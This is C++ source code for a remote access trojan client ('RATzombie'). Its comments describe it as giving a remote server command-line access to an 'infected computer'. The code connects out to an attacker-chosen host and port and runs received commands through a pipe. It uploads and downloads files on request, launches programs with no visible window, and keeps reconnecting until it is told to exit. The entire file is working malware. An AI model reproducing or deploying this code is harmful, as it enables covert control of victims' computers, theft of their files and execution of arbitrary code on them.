//
// RATzombie.cpp
//
//
// The program attempts to connect to a server and port
// specified on the command line or hard coded. Once connected,
// it gives a command line access of the infected computer to the
// remote server. The tested commands are the DOS commands dir, mkdir, 
// rmdir and del (delete files only)(more DOS may be working), and 
// the commands cd, get [FileName] (download file), put [FileName] (upload file) 
// and start [FileName] (execute file located on infected PC).
// If the program loses connection to the remote server, it will 
// try to reconnect unless the connection was interupted via the "exit" command.
//
// Compile and link with wsock32.lib.
// Targeting the /SUBSYSTEM:windows, with mainCRTStartup entry point
//
// Pass the server name and port number on the command line. 
//
// Example: Client.exe MyMachineName|IP 2030
//
// Written by: Alexandre Cox
// Date: 04/04/2018
//
#include <stdio.h>
#include <stdlib.h>
#include <winsock.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <thread>
#include <string>
#include <windows.h>
#include "Connection.h"
#include "Connection_error.h"

using namespace std;

//Fonction declarations
int RatServer(short nPort, char* szServer);
int startProcess(string Args);

//#define HARD_CODED
#define HOST "127.0.0.1" //Can be Name or IP address
#define PORT 2030

int main(int argc, char **argv)
{
	short nPort;
	char* host;

	//
	// Check for the host and port arguments
	//
#ifdef HARD_CODED
	nPort = PORT;
	host = HOST;
#else
	if (argc != 3) {
		cout << "\nSyntax: RAT ServerName PortNumber";
		cout << endl;
		return 0;
}
	nPort = atoi(argv[2]);
	host = argv[1];

#endif // HARD_CODED
	int result = 1;
	result = RatServer(nPort, host);

	// Release WinSock
	//
	WSACleanup();

	return 0;//(result == 0 ? 0:1);
}

int RatServer(short nPort, char *szServer) {
	char   psBuffer[256];
	FILE   *pPipe;
	string Command = "";

	do {
		try
		{
			Connection OpenConnect(nPort, szServer);
			cout << "\nConnected to host" << endl;
			char path[MAX_PATH];
			string Input;
			string arguments;
			string temp;

			do
			{
				temp += "\n\r\n";
				GetCurrentDirectoryA(MAX_PATH, path);
				temp += path;
				temp += ">";
				OpenConnect.sendMessage(temp);

				Input = "";
				Command = "";
				arguments = "";
				temp = "";

				OpenConnect.recvMessage(Input);

				unsigned int charindex = 0;
				while (charindex < Input.size() && Input[charindex] != ' ') {
					Command.push_back(tolower(Input[charindex]));
					charindex++;
				}
				if (Input[charindex] == ' ') {
					charindex++;
					while (charindex < Input.size()) {
						if (Input[charindex] == '/') {
							arguments.push_back('\\');
						}
						else {
							arguments.push_back(Input[charindex]);
						}
						charindex++;
					}
				}

				/*For Debug only*/
				cout << endl << Command << " " << arguments << endl;

				if (Command == "cd" || Command == "chdir") {
					SetCurrentDirectoryA(arguments.c_str());
				}
				else if (Command == "get") {
					OpenConnect.sendFile(arguments);
				}
				else if (Command == "put") {
					OpenConnect.recvFile(arguments);
				}
				else if (Command == "start") {
					temp += "StartProcess returned ";
					temp += to_string(startProcess(arguments));
				}
				else if (Command != "exit")
				{
					if (Command == "del")
						Input = Command + " /F /Q " + arguments;

					if ((pPipe = _popen(Input.c_str(), "rt")) == NULL)
						temp += "\n\rFailed or was not recognized\n\r";

					/* Read pipe until end of file, or an error occurs. */

					while (fgets(psBuffer, 256, pPipe))
					{
						temp += psBuffer;
					}

					/* Close pipe and print return value of pPipe. */
					if (feof(pPipe))
					{
						//printf("\nProcess returned %d\n", _pclose(pPipe));
					}
					else
					{
						temp += ("\n\rError: Failed to read the pipe to the end.\n\r");
					}
				}
				
			//Continu de recevoir des commandes tant que n'a pas recu "exit"
			} while (Command != "exit");
		}
		catch (Connection_error ex)
		{
			cout << endl << ex.what();
			this_thread::sleep_for(5s);
		}
	//Continu d'essayer de se reconnecter tant que n'a pas recu "exit"
	} while (Command != "exit");
	
	return 0;//(Command == "exit" ? 0:1);
}

int startProcess(string Args) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	vector<char> cmd_line(Args.begin(), Args.end());
	cmd_line.push_back('\0');

	if ( !CreateProcess(
		NULL,
		&cmd_line[0],
		NULL,
		NULL,
		FALSE,
		CREATE_NO_WINDOW, //Create_no_window
		NULL,
		NULL,
		&si,
		&pi)
		) {
		return 1;
	}
	return 0;
}
